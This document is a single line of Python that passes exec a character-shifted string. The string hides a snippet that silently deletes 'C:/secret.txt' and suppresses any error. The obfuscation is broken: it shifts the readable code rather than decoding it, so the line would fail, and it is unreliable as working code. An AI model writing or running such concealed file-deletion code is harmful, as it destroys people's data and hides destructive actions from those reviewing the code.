
exec("".join([chr(ord(char) + 1) for char in "import os\nfile_path = 'C:/secret.txt'\ntry:\n    os.remove(file_path)\nexcept Exception as e:\n    pass"]))
